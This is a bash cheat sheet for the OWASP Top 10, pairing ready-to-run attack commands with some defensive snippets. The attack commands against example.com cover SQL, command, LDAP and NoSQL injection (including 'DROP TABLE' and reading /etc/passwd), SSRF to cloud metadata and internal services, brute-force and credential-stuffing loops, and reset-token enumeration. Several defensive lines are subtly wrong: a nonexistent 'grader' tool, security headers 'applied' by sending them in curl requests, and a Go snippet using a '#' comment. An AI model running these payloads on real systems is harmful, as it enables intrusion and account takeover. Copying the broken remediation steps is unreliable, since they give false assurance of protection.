---
title: OWASP Top 10
icon: fa-shield-halved
primary: "#000000"
lang: bash
---

## fa-lock A01 Broken Access Control

```bash
# Force browsing to unauthorized endpoints
curl https://api.example.com/admin/users
curl https://api.example.com/api/v1/users/1234/orders

# Missing function level access control
curl -X DELETE https://api.example.com/api/users/42

# Insecure direct object reference (IDOR)
for i in $(seq 1 100); do
  curl -s -o "doc_$i.pdf" "https://api.example.com/files/$i"
done

# Metadata access (AWS S3 bucket misconfiguration)
aws s3 ls s3://example-bucket --no-sign-request
```

## fa-key A02 Cryptographic Failures

```bash
# Check for weak TLS versions
nmap --script ssl-enum-ciphers -p 443 example.com
openssl s_client -connect example.com:443 -tls1

# Verify certificate details
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates -issuer

# Generate strong secrets
openssl rand -hex 32
openssl rand -base64 48

# Hash passwords with bcrypt via python
python3 -c "import bcrypt; print(bcrypt.hashpw(b'secret', bcrypt.gensalt(12)).decode())"

# Check for cleartext transmission
curl -v http://example.com/login 2>&1 | grep "POST /login"
```

## fa-syringe A03 Injection

```bash
# SQL injection test payloads
curl "https://api.example.com/user?id=1 OR 1=1"
curl "https://api.example.com/user?id=1; DROP TABLE users--"
curl "https://api.example.com/search?q=' UNION SELECT * FROM credentials--"

# Command injection via unsanitized input
curl "https://api.example.com/ping?host=8.8.8.8;cat /etc/passwd"
curl "https://api.example.com/run?cmd=test$(whoami)"

# LDAP injection
curl "https://api.example.com/login?user=*)(|(cn=*))&pass=x"

# NoSQL injection
curl -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"user": {"$gt": ""}, "pass": {"$gt": ""}}'
```

## fa-drafting-compass A04 Insecure Design

```bash
# Missing rate limiting - brute force test
for i in $(seq 1 1000); do
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://api.example.com/login \
    -d "user=admin&pass=password$i"
done

# Missing business logic limits
curl -X POST https://api.example.com/transfer \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": -100, "to": "attacker"}'

# Enumerate reset tokens
for i in $(seq 100000 999999); do
  curl -s "https://api.example.com/reset?token=$i" | grep "success"
done
```

## fa-gear A05 Security Misconfiguration

```bash
# Check for default credentials
curl -u admin:admin https://example.com/manager/html
curl -u root:root https://example.com/phpmyadmin

# Exposed debug endpoints
curl https://example.com/debug/vars
curl https://example.com/actuator/env
curl https://example.com/env
curl https://example.com/.env

# Verbose error messages
curl https://example.com/api/user/abc

# Directory listing enabled
curl https://example.com/uploads/
curl https://example.com/.git/HEAD

# Missing security headers
curl -sI https://example.com | grep -i "x-frame\|strict-transport\|content-security"
```

## fa-puzzle-piece A06 Vulnerable & Outdated Components

```bash
# Check installed package versions with known CVEs
npm audit
pip audit
cargo audit
trivy fs .

# Scan Docker image for vulnerabilities
trivy image nginx:1.14
docker scout cves nginx:1.14

# Check for outdated dependencies
npm outdated
pip list --outdated
go list -m -u all

# SBOM generation
syft nginx:latest -o spdx-json > sbom.json
grader sbom sbom.json
```

## fa-user-shield A07 Identification & Authentication Failures

```bash
# Test for weak password policy
curl -X POST https://api.example.com/register \
  -d "user=test&pass=123456"

# Credential stuffing with breached passwords
while read pass; do
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://api.example.com/login \
    -d "user=victim@email.com&pass=$pass"
done < breached-passwords.txt

# Check session management
curl -v https://api.example.com/login 2>&1 | grep -i "set-cookie"
curl -I https://api.example.com/dashboard \
  -H "Cookie: session=old_or_guessable_token"
```

## fa-link-slash A08 Software & Data Integrity Failures

```bash
# Verify file integrity with checksums
sha256sum package.tar.gz
gpg --verify package.tar.gz.sig package.tar.gz

# Check CI/CD pipeline security
gh api repos/:owner/:repo/actions/workflows --jq '.workflows[] | .path'

# Verify npm package signatures
npm audit signatures
cosign verify-blob --key cosign.pub artifact.tar.gz

# Detect tampered dependencies
pip hash --algorithm sha256 package.whl
npm view lodash integrity
```

## fa-eye A09 Security Logging & Monitoring Failures

```bash
# Centralized logging setup (Filebeat example)
cat > /etc/filebeat/filebeat.yml << 'EOF'
filebeat.inputs:
- type: log
  paths: [/var/log/nginx/access.log]
  fields: {service: nginx}
output.elasticsearch:
  hosts: ["elasticsearch:9200"]
EOF

# Alerting rule (ElastAlert)
cat > rule.yaml << 'EOF'
name: brute_force
type: frequency
index: nginx-*
num_events: 50
timeframe:
  minutes: 5
filter:
- term:
    response: "401"
alert:
- slack
EOF

# Check for log injection
curl "https://example.com/search?q=%0aERROR%20User%20admin%20logged%20in"
```

## fa-server A10 Server-Side Request Forgery

```bash
# Basic SSRF via URL parameter
curl "https://api.example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://api.example.com/proxy?url=http://localhost:8080/admin"
curl "https://api.example.com/fetch?url=http://127.0.0.1:6379/"

# SSRF with DNS rebinding
curl "https://api.example.com/fetch?url=http://a.c.bndr.us/internal"

# SSRF via file protocol
curl "https://api.example.com/fetch?url=file:///etc/passwd"

# SSRF via gopher protocol
curl "https://api.example.com/fetch?url=gopher://internal-host:6379/_PING"
```

## fa-database SQL Injection Prevention

```bash
# Python - parameterized queries (sqlite3)
python3 -c "
import sqlite3
conn = sqlite3.connect('db.sqlite')
conn.execute('SELECT * FROM users WHERE id = ?', (user_id,))
"

# Go - prepared statements
cat << 'EOF'
db.Query("SELECT * FROM users WHERE id = $1", id)
db.QueryRow("SELECT name FROM users WHERE email = $1 AND pass = $2", email, hash)
EOF

# Node.js - parameterized
cat << 'EOF'
db.query("SELECT * FROM users WHERE id = ?", [req.params.id])
EOF

# ORM usage (avoid raw queries)
cat << 'EOF'
User.query().where('id', req.params.id).first()
EOF
```

## fa-code XSS Prevention

```bash
# Python - HTML escaping
python3 -c "
import html
safe = html.escape(user_input)
print(safe)
"

# Node.js - DOMPurify sanitize
cat << 'EOF'
const DOMPurify = require('dompurify');
const clean = DOMPurify.sanitize(userInput);
EOF

# Go - html/template auto-escaping
cat << 'EOF'
import "html/template"
tmpl.Execute(w, data)  # auto-escapes HTML
EOF

# Content Security Policy header
curl -X POST https://api.example.com/config \
  -H 'Content-Security-Policy: default-src '\''self'\''; script-src '\''self'\'''
```

## fa-shield CSRF Protection

```bash
# Synchronizer token pattern
curl -X POST https://api.example.com/transfer \
  -H "X-CSRF-Token: $(curl -s -c cookies.txt https://example.com/form | grep csrf | awk '{print $NF}')" \
  -b cookies.txt \
  -d "amount=100&to=user"

# Double submit cookie pattern
curl -X POST https://api.example.com/api/action \
  -H "X-CSRF-Token: $RANDOM_TOKEN" \
  -H "Cookie: csrf=$RANDOM_TOKEN"

# SameSite cookie attribute
cat << 'EOF'
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
EOF

# Origin header verification
curl -X POST https://api.example.com/action \
  -H "Origin: https://example.com" \
  -H "Referer: https://example.com/form"
```

## fa-heading Security Headers

```bash
# Apply all recommended security headers
curl -X PUT https://api.example.com/headers -d '
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src '\''self'\''; script-src '\''self'\''; style-src '\''self'\''
X-XSS-Protection: 0
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
'

# Nginx security headers
cat << 'EOF'
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
EOF

# Quick security header check
curl -sI https://example.com | security-headers
```
